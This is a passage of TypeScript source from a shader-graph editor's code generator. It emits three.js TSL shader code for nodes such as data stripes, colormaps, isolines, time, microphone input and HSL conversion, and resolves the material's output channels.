      const lineStrength = Math.min(Math.max(Number(nv.lineStrength ?? 0.75), 0), 1);
      addImport('three/tsl', 'float');
      addImport('three/tsl', 'color');
      addImport('three/tsl', 'uv');
      addImport('three/tsl', 'dFdx');
      addImport('three/tsl', 'dFdy');
      if (radial) addImport('three/tsl', 'vec2');

      const signalEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'signal');
      const signalRef = signalEdge ? resolveEdgeRef(signalEdge, edges, varNames, sorted) : null;

      // Trace the signal to a Data column → bake a cumulative-phase ramp (stripe
      // density) AND a normalized-value ramp (color). Both are sampled at the
      // SAME coordinate, so linear and radial modes stay in sync.
      let phaseTexVar: string | null = null;
      let valueTexVar: string | null = null;
      let totalCycles = bf;
      const traced = traceSignalColumn(signalEdge, sorted);
      if (traced) {
        const ramp = buildPhaseRamp(traced.cnorm, bf, dens);
        totalCycles = ramp.totalCycles;
        addImport('three/tsl', 'texture');
        addImport('three/tsl', 'vec2');
        phaseTexVar = `_${varName}_phase`;
        valueTexVar = `_${varName}_value`;
        bakeHalfFloatTexture(setupLines, phaseTexVar, ramp.phase01);
        bakeHalfFloatTexture(setupLines, valueTexVar, traced.cnorm);
      }

      const coord = `_${varName}_coord`;
      const p = `_${varName}_p`;
      const tri = `_${varName}_tri`;
      const fw = `_${varName}_fw`;
      const ln = `_${varName}_ln`;
      const lnS = `_${varName}_lnS`;
      const br = `_${varName}_br`;
      const t = `_${varName}_t`;
      const col = `_${varName}_col`;

      // Sampling coordinate in [0,1]: horizontal position (linear), or the
      // normalized radius from the chosen center (concentric rings) when radial.
      bodyLines.push(`  const ${coord} = ${radialCoordExpr(radial, cx, cy, radius)};`);

      const phaseExpr = phaseTexVar
        ? `texture(${phaseTexVar}, vec2(${coord}, 0.5)).x.mul(${num(totalCycles)})`
        : `${coord}.mul(${num(bf)})`;
      const colorT = valueTexVar
        ? `texture(${valueTexVar}, vec2(${coord}, 0.5)).x`
        : signalRef
          ? `${signalRef}.clamp(0.0, 1.0)`
          : coord;

      // Continuous phase (NEVER take the derivative of fract(phase)).
      bodyLines.push(`  const ${p} = ${phaseExpr};`);
      bodyLines.push(`  const ${tri} = ${p}.fract().mul(2.0).sub(1.0).abs();`);
      bodyLines.push(`  const ${fw} = dFdx(${p}).abs().add(dFdy(${p}).abs());`);
      bodyLines.push(`  const ${ln} = ${tri}.smoothstep(float(0.5).sub(${fw}), float(0.5).add(${fw}));`);
      // Fade dense (sub-pixel) regions to the average band so they don't shimmer.
      bodyLines.push(`  const ${lnS} = ${ln}.mix(float(0.5), ${fw}.mul(2.0).sub(1.0).clamp(0.0, 1.0));`);
      bodyLines.push(`  const ${br} = float(1.0).sub(${lnS}.mul(${num(lineStrength)}));`);
      bodyLines.push(`  const ${t} = ${colorT};`);
      bodyLines.push(`  const ${col} = color(${lo}).mix(color(${hi}), ${t});`);
      bodyLines.push(`  const ${varName} = ${col}.mul(${br});`);
    } else if (def.type === 'dataviz') {
      // Data Viz: a single Data column distributed along one axis (or radially)
      // as a continuous colour ramp with a full tone curve. Unlike Stripes there
      // are no bars — colour alone reads the value. The upstream column is baked
      // into a normalized HalfFloat value texture (filterable) and sampled at the
      // coord; the tone curve is applied as a chain of TSL ops before the mix.
      const nv = getNodeValues(node);
      const scale = Number(nv.scale ?? 1);
      const offset = Number(nv.offset ?? 0);
      const contrast = Number(nv.contrast ?? 1);
      const lowCut = Number(nv.lowCutoff ?? 0);
      const highCut = Number(nv.highCutoff ?? 1);
      // Midpoint drives a gamma so the chosen input value maps to output 0.5
      // (lower midpoint → brighter midtones). Kept strictly inside (0,1) so the
      // log is finite.
      const midpoint = Math.min(Math.max(Number(nv.midpoint ?? 0.5), 1e-3), 1 - 1e-3);
      // sRGB → linear via `color(0x…)`; see the matching note in the Stripes
      // branch above.
      const lo = hexLiteral(nv.lowColor ?? '#1b2a4a');
      const hi = hexLiteral(nv.highColor ?? '#ffd24d');
      const radial = Number(nv.radial ?? 0) >= 0.5;
      const cx = Number(nv.center_x ?? 0.5);
      const cy = Number(nv.center_y ?? 0.5);
      const radius = Math.max(Number(nv.radius ?? 0.5), 1e-4);
      addImport('three/tsl', 'color');
      addImport('three/tsl', 'uv');
      if (radial) addImport('three/tsl', 'vec2');

      // Trace the signal to a Data column → bake a normalized-value ramp (color).
      const signalEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'signal');
      const signalRef = signalEdge ? resolveEdgeRef(signalEdge, edges, varNames, sorted) : null;
      let valueTexVar: string | null = null;
      const traced = traceSignalColumn(signalEdge, sorted);
      if (traced) {
        addImport('three/tsl', 'texture');
        addImport('three/tsl', 'vec2');
        valueTexVar = `_${varName}_value`;
        bakeHalfFloatTexture(setupLines, valueTexVar, traced.cnorm);
      }

      const coord = `_${varName}_coord`;
      bodyLines.push(`  const ${coord} = ${radialCoordExpr(radial, cx, cy, radius)};`);

      // Raw normalized value in [0,1] at this coord.
      const rawExpr = valueTexVar
        ? `texture(${valueTexVar}, vec2(${coord}, 0.5)).x`
        : signalRef
          ? `${signalRef}.clamp(0.0, 1.0)`
          : `${coord}`;

      // Tone curve: scale/offset → input cutoffs (levels) → clamp → midpoint
      // (gamma) → contrast → clamp. Each stage is skipped when it's a no-op so
      // the emitted expression stays readable for identity settings.
      let expr = rawExpr;
      if (scale !== 1 || offset !== 0) {
        expr = `${expr}.mul(${num(scale)}).add(${num(offset)})`;
      }
      if (lowCut !== 0 || highCut !== 1) {
        const span = highCut - lowCut;
        const safeSpan = Math.abs(span) < 1e-4 ? (span < 0 ? -1e-4 : 1e-4) : span;
        expr = `${expr}.sub(${num(lowCut)}).div(${num(safeSpan)})`;
      }
      expr = `${expr}.clamp(0.0, 1.0)`;
      const gamma = Math.log(0.5) / Math.log(midpoint);
      if (Math.abs(gamma - 1) > 1e-3) {
        expr = `${expr}.pow(${num(gamma)})`;
      }
      if (contrast !== 1) {
        expr = `${expr}.sub(0.5).mul(${num(contrast)}).add(0.5).clamp(0.0, 1.0)`;
      }

      const t = `_${varName}_t`;
      bodyLines.push(`  const ${t} = ${expr};`);
      bodyLines.push(`  const ${varName} = color(${lo}).mix(color(${hi}), ${t});`);
    } else if (def.type === 'colormap') {
      // Colormap: scalar → colour through a 256-texel LUT baked at code-gen.
      //
      // A LUT rather than a polynomial fit: the fetch is one texture read
      // (cheaper than a 6th-order polynomial per channel), it reproduces the
      // published table exactly instead of to ±2/255, and the same machinery
      // will serve user-authored ramps. The table is baked in LINEAR light and
      // the texture carries no colour-space tag, so no conversion happens on
      // sample — see buildColormapLut.
      const nv = getNodeValues(node);
      const cmap = getColormap(nv.map);
      const reverse = Number(nv.reverse ?? 0) >= 0.5;
      const levels = Math.floor(Number(nv.levels ?? 0));
      const lutVar = `_${varName}_lut`;
      // `reverse` is baked into the table, so it costs nothing per fragment and
      // the emitted TSL is identical either way.
      bakeColormapTexture(setupLines, lutVar, buildColormapLut(cmap, reverse));
      addImport('three/tsl', 'texture');
      addImport('three/tsl', 'vec2');

      const valueEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'value');
      let tExpr = scalarRefOf(valueEdge);
      if (!tExpr) {
        // Unwired: ramp across uv.x, so a freshly dropped Colormap node shows
        // the map it is set to instead of a flat colour.
        addImport('three/tsl', 'uv');
        tExpr = 'uv().x';
      }

      if (levels >= 2) {
        // Discrete levels: quantize to band CENTRES, matching what the settings
        // preview draws. The clamp keeps t = 1 exactly inside the top band —
        // without it floor(t·N) reaches N and the very last value reads a
        // different colour from the rest of its band.
        const qVar = `_${varName}_q`;
        bodyLines.push(
          `  const ${qVar} = ${tExpr}.clamp(0.0, 0.999999).mul(${num(levels)}).floor().add(0.5).div(${num(levels)});`,
        );
        tExpr = qVar;
      }

      // Half-texel inset so t = 0 and t = 1 land on the ramp's true endpoints.
      const uExpr = `${tExpr}.mul(${num(LUT_COORD_SCALE)}).add(${num(LUT_COORD_OFFSET)})`;
      bodyLines.push(`  const ${varName} = texture(${lutVar}, vec2(${uExpr}, 0.5)).rgb;`);
    } else if (def.type === 'dataRange') {
      // Data Range: raw data units → 0-1. The DOMAIN is decided on the CPU
      // (planNormalize), where the whole column is visible; the shader only ever
      // evaluates the resulting affine / log / symlog expression.
      const nv = getNodeValues(node);
      const mode = isNormalizeMode(nv.mode) ? nv.mode : 'minmax';
      const valueEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'value');
      const traced = traceSignalColumn(valueEdge, sorted);
      const stats = traced ? columnStats(traced.capped) : null;
      const manual = {
        lo: Number(nv.domainMin ?? 0),
        hi: Number(nv.domainMax ?? 1),
      };
      const plan = planNormalize(mode, stats, manual);
      const doClamp = Number(nv.clamp ?? 1) >= 0.5;

      let src = scalarRefOf(valueEdge);
      if (!src) {
        addImport('three/tsl', 'uv');
        src = 'uv().x';
      }

      let expr: string;
      if (plan.kind === 'affine') {
        // Multiply by the reciprocal rather than divide: `div` is 4× the cost of
        // `mul` in the complexity table for an identical result here, since the
        // span is a compile-time constant.
        const inv = 1 / (plan.hi - plan.lo);
        expr = `${src}.sub(${num(plan.lo)}).mul(${num(inv)})`;
      } else if (plan.kind === 'log') {
        const l0 = Math.log2(plan.lo);
        const inv = 1 / (Math.log2(plan.hi) - l0);
        expr = `${src}.max(${num(plan.lo)}).log2().sub(${num(l0)}).mul(${num(inv)})`;
      } else {
        // symlog: linear within ±thresh, logarithmic beyond, 0 → exactly 0.5.
        const invT = 1 / plan.thresh;
        const invY = 1 / Math.log2(1 + plan.m / plan.thresh);
        expr =
          `${src}.sign().mul(${src}.abs().mul(${num(invT)}).add(1.0).log2().mul(${num(invY)}))` +
          `.mul(0.5).add(0.5)`;
      }
      if (doClamp) expr = `${expr}.clamp(0.0, 1.0)`;
      bodyLines.push(`  const ${varName} = ${expr};`);
    } else if (def.type === 'isolines') {
      // Isolines: antialiased contours wherever the value crosses a multiple of
      // 1/levels. Same construction as Data Stripes — the derivative is taken of
      // the CONTINUOUS phase, never of fract(phase), and dense contours fade to
      // their average coverage instead of aliasing into moiré.
      addImport('three/tsl', 'float');
      addImport('three/tsl', 'dFdx');
      addImport('three/tsl', 'dFdy');

      const levelsExpr = numericParam(node, 'levels', 10, edges, varNames, sorted);
      const widthExpr = numericParam(node, 'width', 1.5, edges, varNames, sorted);
      const offsetExpr = numericParam(node, 'offset', 0, edges, varNames, sorted);

      const valueEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'value');
      let src = scalarRefOf(valueEdge);
      if (!src) {
        addImport('three/tsl', 'uv');
        src = 'uv().x';
      }

      const p = `_${varName}_p`;
      const fw = `_${varName}_fw`;
      const hw = `_${varName}_hw`;
      const d = `_${varName}_d`;
      const ln = `_${varName}_ln`;
      const avg = `_${varName}_avg`;

      bodyLines.push(`  const ${p} = ${src}.sub(${offsetExpr}).mul(${levelsExpr});`);
      // Phase change per pixel. Floored away from zero: on a perfectly flat
      // region the derivatives are 0 and the smoothstep edges would collapse
      // onto each other, which is a divide-by-zero inside the hardware step.
      bodyLines.push(
        `  const ${fw} = dFdx(${p}).abs().add(dFdy(${p}).abs()).max(0.00001);`,
      );
      bodyLines.push(`  const ${hw} = ${fw}.mul(${widthExpr}).mul(0.5);`);
      // Distance to the nearest contour, in phase units: 0 on the line, 0.5
      // midway between two.
      bodyLines.push(`  const ${d} = float(0.5).sub(${p}.fract().sub(0.5).abs());`);
      bodyLines.push(`  const ${ln} = ${d}.smoothstep(float(0.0), ${hw}).oneMinus();`);
      // Average coverage of one period — what the region SHOULD read as once the
      // contours are packed tighter than a pixel.
      bodyLines.push(`  const ${avg} = ${fw}.mul(${widthExpr}).clamp(0.0, 1.0);`);
      bodyLines.push(
        `  const ${varName} = ${ln}.mix(${avg}, ${fw}.mul(2.0).sub(1.0).clamp(0.0, 1.0));`,
      );
    } else if (def.type === 'append') {
      // Append node: concatenate operands into a vector. The constructor follows
      // the TOTAL component count (a vec2 + float must become vec3, not vec2),
      // and both it and the argument list are capped at vec4.
      const raw = resolveArguments(node, edges, varNames, def, sorted);
      const channels = appendOperandChannels(node, edges, sorted, def);
      const { ctor, args } = buildAppendConstructor(raw, channels);
      addImport('three/tsl', ctor);
      bodyLines.push(`  const ${varName} = ${ctor}(${args.join(', ')});`);
    } else if (def.type === 'time') {
      // Time node: elapsed seconds, optionally scaled by the `speed` multiplier
      // edited in Node Settings. Handled BEFORE the generic
      // `inputs.length === 0 && defaultValues` branch, which would emit
      // `time(1)` — `time` is a uniform NODE OBJECT (three's nodes/utils/
      // Timer.js), not a callable, so that would be a runtime TypeError.
      //
      // speed === 1 (and legacy nodes with no stored speed, and any value that
      // does not coerce to a finite number) emits the historical bare reference
      // BYTE-FOR-BYTE so no already-exported shader changes. Note Number('') and
      // Number(null) are 0, not NaN — those land on a real `.mul(0)`, which is
      // the same frozen-time result the UI can already produce, not an escape.
      // The multiplied form is a METHOD
      // CHAIN, not `mul(time, k)`: it needs no extra import (same convention as
      // the noise `scale` param below), and the bare-`time` receiver is a shape
      // nothing in src/ or Tests/ writes by hand, so codeToGraph can collapse it
      // back without ever eating a user's real Multiply node.
      //
      // `values` is adversarial (.fastshader / localStorage): Number() kills the
      // array-stringification vector and isFinite() kills NaN/±Infinity. Do NOT
      // route this through resolveExposedParam — that helper is String()-only.
      //
      // `speed` is also an opt-in INPUT socket. A wired edge overrides the
      // stored number (the exposedPorts rule) and emits the same method-chain
      // shape with the upstream var in place of the literal, so the two forms
      // stay one thing for codeToGraph to collapse.
      const speedEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'speed');
      const speedRef = speedEdge ? resolveEdgeRef(speedEdge, edges, varNames, sorted) : null;
      const rawSpeed = Number(getNodeValues(node).speed);
      const speed = Number.isFinite(rawSpeed) ? rawSpeed : 1;
      bodyLines.push(
        speedRef
          ? `  const ${varName} = ${def.tslFunction}.mul(${speedRef});`
          : speed === 1
            ? `  const ${varName} = ${def.tslFunction};`
            : `  const ${varName} = ${def.tslFunction}.mul(${num(speed)});`,
      );
    } else if (def.type === 'micNode') {
      // Mic node: four live 0–1 values emitted as ORDINARY NUMERIC UNIFORMS.
      //
      // This shape is the whole design. `const mic1_bass = uniform(0);` means
      // the entire transport is the fs:uniform postMessage channel that already
      // exists — nothing new crosses the preview sandbox boundary except
      // numbers — and buildShaderModule's `uniformLineRe` pass rewrites the
      // line to `params.mic1_bass` and records a `{type:'number'}` schema entry
      // with no changes to PropertyInfo or collectShaderProperties. So the
      // DOWNLOADED module has four real properties an embedding page can drive.
      // Emitting anything cleverer (a data texture, a custom node type) would
      // trade that away for nothing the preview can use.
      //
      // Handled BEFORE the generic `inputs.length === 0 && defaultValues`
      // branch, which would emit `(0.8)` — micNode's tslFunction is empty
      // because it is hand-emitted, and its defaultValues are the analyser
      // settings, not a constructor argument. Same trap the Time node avoids.
      //
      // Only CONSUMED channels are emitted (the Data node's `usedCols` rule):
      // an unwired channel would otherwise ship a dead slider in the exported
      // schema and in podest's auto-generated uniform list.
      //
      // The default is 0, not a mid-scale value: an unarmed mic, a downloaded
      // file, and podest must all render the same defined "silence" state
      // rather than a value that looks like signal.
      const wanted = new Set(
        edges
          .filter((e) => e.source === node.id)
          .map((e) => micChannelForHandle(e.sourceHandle)),
      );
      if (wanted.size > 0) {
        // The generic import collection keys off `def.tslFunction`, which is
        // empty here, so `uniform` must be requested explicitly.
        addImport('three/tsl', 'uniform');
        // Gain is a SEPARATE statement, never `uniform(0).mul(g)`: the
        // uniform line has to stay a bare literal for buildShaderModule's
        // `uniformLineRe` to rewrite it into `params.<name>` and record a
        // schema entry. Fold the multiply into it and the property vanishes
        // from the export AND the shaderloader stops binding it, which breaks
        // the live preview too. Method chain — no extra import, same
        // convention as the noise `scale` and the Time node's `speed`.
        const gainExpr = micGainExpr(node, edges, varNames, sorted);
        for (const ch of MIC_CHANNELS) {
          if (!wanted.has(ch)) continue;
          const u = micUniformName(varName, ch);
          bodyLines.push(`  const ${u} = uniform(0);`);
          if (gainExpr) bodyLines.push(`  const _${u} = ${u}.mul(${gainExpr});`);
        }
      }
    } else if (def.inputs.length === 0 && def.category === 'input' && !def.defaultValues) {
      // Input nodes: bare reference (positionGeometry, screenUV, etc.)
      bodyLines.push(`  const ${varName} = ${def.tslFunction};`);
    } else if (def.category === 'noise') {
      // Noise nodes: all params come from exposed ports / stored values.
      // Handled BEFORE the generic `inputs.length === 0 && defaultValues` branch
      // because noise nodes have multiple default values (pos + scale) that the
      // generic branch can't express.
      const nv = getNodeValues(node);

      // Resolve position: from exposed port edge, or default positionGeometry
      let posExpr = resolveExposedParam(node, 'pos', edges, varNames, nv, sorted);
      if (/^\d+(\.\d+)?$/.test(posExpr) || posExpr === 'positionGeometry') {
        posExpr = 'positionGeometry';
        addImport('three/tsl', 'positionGeometry');
      }

      // Apply scale via method chain so the result keeps the position's vector type
      const scaleExpr = resolveExposedParam(node, 'scale', edges, varNames, nv, sorted);
      if (scaleExpr !== '1') {
        posExpr = `${posExpr}.mul(${scaleExpr})`;
      }

      bodyLines.push(`  const ${varName} = ${def.tslFunction}(${posExpr});`);
    } else if (def.type === 'property_color') {
      // Colour uniform. The generic branch below would emit `uniform(0xff0000)`
      // — a FLOAT uniform holding 16711680 — so wrap the literal in color() to
      // get a real vec3-valued uniform. buildShaderModule rewrites this whole
      // line to `params.<name>` and records the hex as the schema default.
      const nv = getNodeValues(node);
      addImport('three/tsl', 'color');
      bodyLines.push(`  const ${varName} = uniform(color(${hexLiteral(nv.hex)}));`);
    } else if (def.inputs.length === 0 && def.defaultValues) {
      // Type constructors with default values
      const nodeValues = getNodeValues(node);
      const defaultKey = Object.keys(def.defaultValues)[0];
      const val = nodeValues?.[defaultKey] ?? Object.values(def.defaultValues)[0];
      const formatted = typeof val === 'string' && val.startsWith('#')
        ? hexLiteral(val)
        : val;
      bodyLines.push(`  const ${varName} = ${def.tslFunction}(${formatted});`);
    } else if (def.type === 'hsl' || def.type === 'toHsl') {
      // HSL↔RGB: neither `hsl` nor `toHsl` exist in three/tsl, so we emit
      // module-local helper Fn declarations (see buildColorHelpers below) and
      // call them here. The helpers are auto-included whenever either node is
      // used; the matching `path.skip()` in codeToGraph prevents round-trip
      // pollution of the graph.
      const call = def.type === 'hsl' ? 'hsl' : 'toHsl';
      const fallback = def.type === 'hsl' ? '0, 0, 0' : 'vec3(0, 0, 0)';
      const argExpr = def.type === 'hsl'
        ? args.join(', ')
        : (args[0] ?? fallback);
      bodyLines.push(`  const ${varName} = ${call}(${argExpr});`);
    } else {
      // Regular function call
      bodyLines.push(`  const ${varName} = ${def.tslFunction}(${args.join(', ')});`);
    }
  }

  // Handle output node — resolve all connected channels
  const outputNode = sorted.find((n) => n.data.registryType === 'output');
  const OUTPUT_CHANNELS = ['color', 'emissive', 'normal', 'position', 'opacity', 'roughness'] as const;
  const channels: Record<string, string> = {};
  // Discard is a side-effect statement, not a return channel — emitted as
  // `Discard(cond);` between definitions and the return so the wired condition
  // (e.g. greaterThan(distance(positionWorld, cameraPosition), maxDist)) kills
  // the fragment before any further work.
  let discardLine: string | null = null;

  // Channels that the WebGL/WebGPU backend will validate as vec3-typed. A
  // bool-producing source (logic category) wired straight into one of these
  // links a broken shader program — WebGL then spams INVALID_OPERATION on
  // every frame. Coerce to `vec3(float(...))` so the shader is well-typed and
  // the boolean visualises as black/white instead of melting the renderer.
  const VEC3_CHANNELS = new Set(['color', 'emissive', 'normal', 'position']);

  /**
   * The channels whose value ends up in `diffuseColor`, and therefore in
   * ALPHA. Only these get the shape normalisation below — `normal` and
   * `position` never reach alpha, and widening `position` would actively break
   * the Data Viz `value` → Displacement flow, where the scalar height is meant
   * to stay scalar so normal-mode displacement can scale the normal by it.
   * `emissive` is included because shaderloader 0.5 copies emissiveNode into
   * colorNode when no colour is wired (line ~279).
   */
  const ALPHA_BEARING_CHANNELS = new Set(['color', 'emissive']);

  if (outputNode) {
    for (const ch of OUTPUT_CHANNELS) {
      const edge = edges.find(
        (e) => e.target === outputNode.id && e.targetHandle === ch
      );
      if (edge) {
        const ref = resolveEdgeRef(edge, edges, varNames, sorted);
        if (ref) {
          const sourceNode = sorted.find((n) => n.id === edge.source);
          const sourceDef = sourceNode ? registry.get(sourceNode.data.registryType) : undefined;
          if (sourceDef?.category === 'logic' && VEC3_CHANNELS.has(ch)) {
            addImport('three/tsl', 'vec3');
            addImport('three/tsl', 'float');
            channels[ch] = `vec3(float(${ref}))`;
          } else if (ALPHA_BEARING_CHANNELS.has(ch) && shapeOfEdgeSource(edge) !== 3) {
            // Anything that ISN'T already 3 channels gets normalised to vec3
            // here, rather than left for the renderer to reinterpret.
            //
            // three's NodeMaterial.setupDiffuseColor does
            // `vec4(this.colorNode)`, and TSL splats a 1-channel node across
            // ALL FOUR components — so a bare `mx_noise_float(...)` wired to
            // Color silently became the ALPHA too (diffuseColor.a = noise),
            // making the surface flicker/vanish as if Opacity or Discard were
            // connected when neither is. `vec3(x)` fixes alpha at the
            // material's own opacity while giving the intended grey ramp.
            //
            // The gate is `!== 3`, not `=== 1`, because the SAME leak runs the
            // other way: `vec4(vec4)` is an identity cast, so a Vec4 node (or
            // an Append grown to 4) wired to Color hands its `w` straight to
            // alpha — and a fresh Vec4's w is 0, i.e. fully transparent.
            // `vec3(vec4expr)` truncates to `.xyz` and alpha returns to 1.0
            // via format's `vec4(vec3, 1.0)` path. Alpha must come ONLY from
            // the opacity channel.
            //
            // Scoped to the alpha-bearing channels only (see the set above).
            addImport('three/tsl', 'vec3');
            channels[ch] = `vec3(${ref})`;
          } else if (ch === 'normal' && sourceNode?.data.registryType === 'imageNode') {
            // An image wired into Normal is a tangent-space normal MAP, not a raw
            // normal — its texels are packed unit vectors in [0,1]. Decode with
            // TSL's normalMap() node: it remaps [0,1]→[-1,1], applies the TBN
            // (tangent→view) transform and normalizes. Assigning the raw sample
            // to normalNode instead would leave every component ≥0, unnormalized
            // and un-rotated → a flat, blue-biased surface. normalMap() assumes
            // LINEAR input, so the Image node is auto-switched to the 'data'
            // colorSpace when it is connected here (NodeEditor onConnect).
            addImport('three/tsl', 'normalMap');
            channels[ch] = `normalMap(${ref})`;
          } else {
            channels[ch] = ref;
          }
        }
      }
    }

    const discardEdge = edges.find(
      (e) => e.target === outputNode.id && e.targetHandle === 'discard'
    );
    if (discardEdge) {
      const ref = resolveEdgeRef(discardEdge, edges, varNames, sorted);
      if (ref) {
        addImport('three/tsl', 'Discard');
        discardLine = `  Discard(${ref});`;
      }
    }
  }

  // Build return line — single value for color-only, object for multiple channels
  let returnLine: string;
  const channelEntries = Object.entries(channels);

  if (channelEntries.length === 0) {
    // No trailing comment: a `//` on a return line used to defeat parseBody's
    // end-anchored regexes in tslCodeProcessor, which then treated this as a
    // plain statement and let it short-circuit the real module return.
    returnLine = '  return vec3(1, 0, 0);';
  } else if (channelEntries.length === 1 && channels.color) {
    returnLine = `  return ${channels.color};`;
  } else {
    const props = channelEntries.map(([k, v]) => `${k}: ${v}`).join(', ');
    returnLine = `  return { ${props} };`;
  }

  // Ensure vec3 is imported if used in fallback return
  if (returnLine.includes('vec3(')) {
    addImport('three/tsl', 'vec3');
  }

  // Build import lines (after all imports are collected)
  const importLines: string[] = [];
  for (const [module, names] of importsByModule) {
    const sortedNames = Array.from(names).sort();
    importLines.push(`import { ${sortedNames.join(', ')} } from '${module}';`);
  }

  const helperLines: string[] = [];
  if (usedHsl) helperLines.push(...HSL_HELPER_LINES, '');
  if (usedToHsl) helperLines.push(...TO_HSL_HELPER_LINES, '');

  const code = [
    ...importLines,
    '',
    ...helperLines,
    // Module-scope DataTexture construction (Data/Stripes nodes) — must precede
    // the shader Fn so its body can close over the textures.
    ...(setupLines.length ? [...setupLines, ''] : []),
    'const shader = Fn(() => {',
    ...bodyLines,
    ...(discardLine ? [discardLine] : []),
    '',
    returnLine,
    '});',
    '',
    'export default shader;',
    '',
  ].join('\n');

  return { code, importStatements: importLines, varNames };
}

/**
 * HSL → RGB helper emitted at module scope when the graph contains an hsl node.
 * `hsl` is not an export of `three/tsl`, so we ship our own branchless implementation
 * (GLSL-style — no conditionals, suitable for the GPU).
 */
const HSL_HELPER_LINES = [
  'const hsl = Fn(([h, s, l]) => {',
  '  const h6 = mul(h, float(6));',
  '  const rk = clamp(sub(abs(sub(mod(add(h6, float(0)), float(6)), float(3))), float(1)), float(0), float(1));',
  '  const gk = clamp(sub(abs(sub(mod(add(h6, float(4)), float(6)), float(3))), float(1)), float(0), float(1));',
  '  const bk = clamp(sub(abs(sub(mod(add(h6, float(2)), float(6)), float(3))), float(1)), float(0), float(1));',
  '  const sat = mul(s, sub(float(1), abs(sub(mul(float(2), l), float(1)))));',
  '  return vec3(',
  '    add(l, mul(sat, sub(rk, float(0.5)))),',
  '    add(l, mul(sat, sub(gk, float(0.5)))),',
  '    add(l, mul(sat, sub(bk, float(0.5)))),',
  '  );',
  '});',
];

/**
 * RGB → HSL helper. Branchless via select/greaterThan/equal so GPU warp divergence
 * stays low. Uses `max(d, 1e-10)` to dodge division-by-zero on neutral/grayscale
 * inputs; the outer `select(d > 0, …, 0)` then zeros hue/saturation cleanly.
 */
const TO_HSL_HELPER_LINES = [
  'const toHsl = Fn(([rgb]) => {',
  '  const maxC = max(max(rgb.x, rgb.y), rgb.z);',
  '  const minC = min(min(rgb.x, rgb.y), rgb.z);',
  '  const d = sub(maxC, minC);',
  '  const L = mul(add(maxC, minC), float(0.5));',
  '  const satDenom = max(sub(float(1), abs(sub(mul(L, float(2)), float(1)))), float(1e-10));',
  '  const S = select(greaterThan(d, float(0)), div(d, satDenom), float(0));',
  '  const dSafe = max(d, float(1e-10));',
  '  const hR = add(div(sub(rgb.y, rgb.z), dSafe), select(lessThan(rgb.y, rgb.z), float(6), float(0)));',
  '  const hG = add(div(sub(rgb.z, rgb.x), dSafe), float(2));',
  '  const hB = add(div(sub(rgb.x, rgb.y), dSafe), float(4));',
  '  const hueSeg = select(equal(maxC, rgb.x), hR, select(equal(maxC, rgb.y), hG, hB));',
  '  const H = select(greaterThan(d, float(0)), mul(hueSeg, float(1 / 6)), float(0));',
  '  return vec3(H, S, L);',
  '});',
];

/**
 * Build an append node's vector constructor over ALL its wired operands.
 *
 * The output size is the SUM of the operands' channel counts (connected =
 * evaluate upstream; unconnected = scalar = 1), and a GPU vector holds at most
 * 4 — there is no vec5. So the sum is capped at 4, and, crucially, the
 * ARGUMENTS are capped with it: an operand that would overflow the vec4 is
 * swizzled down to the components that still fit, and operands past the fourth
 * channel are dropped entirely.
 *
 * Trimming the arguments is what makes the cap real. Clamping only the
 * constructor emitted `vec4(vec3A, vec3B)` for two vec3s — a 4-slot
 * constructor handed 6 components, which is not valid TSL.
 */
function buildAppendConstructor(
  args: string[],
  channels: number[],
): { ctor: 'vec2' | 'vec3' | 'vec4'; args: string[] } {
  const out: string[] = [];
  let total = 0;
  for (let i = 0; i < args.length && total < 4; i++) {
    const room = 4 - total;
    const ch = Math.max(1, channels[i] ?? 1);
    if (ch <= room) {
      out.push(args[i]);
      total += ch;
    } else {
      // ch > room implies ch >= 2, so this operand is a vector and `.xyzw`
      // swizzling is well-formed.
      out.push(`${args[i]}.${'xyzw'.slice(0, room)}`);
      total += room;
    }
  }
  // Two base sockets are always present, so total >= 2 and vec2 is the floor.
  const size = Math.min(Math.max(total, 2), 4);
  return { ctor: size === 2 ? 'vec2' : size === 3 ? 'vec3' : 'vec4', args: out };
}

/** Channel count each of an append node's operands contributes, in socket order. */
function appendOperandChannels(
  node: AppNode,
  edges: AppEdge[],
  nodes: AppNode[],
  def: NodeDefinition,
): number[] {
  const connected = edges
    .filter((e) => e.target === node.id && typeof e.targetHandle === 'string')
    .map((e) => e.targetHandle as string);
  const inputs = effectiveInputs(def, connected, false, Object.keys(getNodeValues(node)));
  return inputs.map((input) => {
    const edge = edges.find((e) => e.target === node.id && e.targetHandle === input.id);
    return edge ? getComponentCount(edge.source, nodes, edges) : 1;
  });
}

/**
 * The multiplier a Mic node applies to every channel, or null for "none".
 *
 * `gain` is an exposed parameter socket, so a wired edge overrides the stored
 * number (the exposedPorts rule). It is applied in the SHADER rather than in
 * the analyser precisely so that a wire can drive it — an AnalyserNode lives on
 * the CPU and no shader value can reach it (which is also why `smoothing` is
 * deliberately NOT exposable; see isExposableKey).
 *
 * Returns null when the gain is exactly 1 and unwired, so the emission stays
 * BYTE-IDENTICAL to the ungained form and no already-exported shader changes.
 *
 * The stored value goes through `readMicSettings` for its clamp — `values` is
 * adversarial (`.fastshader` / localStorage) — and never through
 * `resolveExposedParam`, which is `String()`-only.
 */
function micGainExpr(
  node: AppNode,
  edges: AppEdge[],
  varNames: Map<string, string>,
  sorted: AppNode[],
): string | null {
  const edge = edges.find(
    // A self-loop would recurse straight back into resolveEdgeRef. The editor
    // never offers a cycle, but a hand-edited project file can contain one.
    (e) => e.target === node.id && e.targetHandle === 'gain' && e.source !== node.id,
  );
  if (edge) {
    const ref = resolveEdgeRef(edge, edges, varNames, sorted);
    if (ref) return ref;
  }
  const { gain } = readMicSettings(getNodeValues(node));
  return gain === 1 ? null : num(gain);
}

/** Resolve a source edge reference, looking through split nodes to inline swizzle. */
function resolveEdgeRef(
  edge: AppEdge,
  edges: AppEdge[],
  varNames: Map<string, string>,
  sorted: AppNode[]
): string | null {
  const sourceNode = sorted.find(n => n.id === edge.source);
  if (!sourceNode) return varNames.get(edge.source) ?? null;

  // Data node: each column output is emitted as its own variable `<var>_colN`
  // (the node has no single value), so address the column by its handle id.
  if (
    sourceNode.data.registryType === 'dataNode' &&
    edge.sourceHandle &&
    /^col\d+$/.test(edge.sourceHandle)
  ) {
    const base = varNames.get(sourceNode.id);
    return base ? `${base}_${edge.sourceHandle}` : null;
  }

  // Mic node: each channel is emitted as its own `<var>_<channel>` uniform
